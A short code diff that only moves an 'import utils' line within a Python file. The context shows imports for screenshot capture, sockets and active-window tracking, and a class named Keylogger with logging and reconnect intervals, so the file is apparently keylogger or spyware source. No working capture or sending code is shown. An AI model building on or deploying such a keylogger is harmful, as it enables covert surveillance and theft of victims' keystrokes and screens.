@@ -6,6 +6,7 @@ import platform
 import pyautogui
 import socket
 import time
+import utils
 
 from datetime import datetime, timedelta
 from functools import partial
@@ -13,8 +14,6 @@ from PIL import ImageGrab
 from screeninfo import get_monitors
 from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
-
-import utils
 
 class Keylogger:
     def __init__(self, log_interval, window_interval, reconnect_interval):
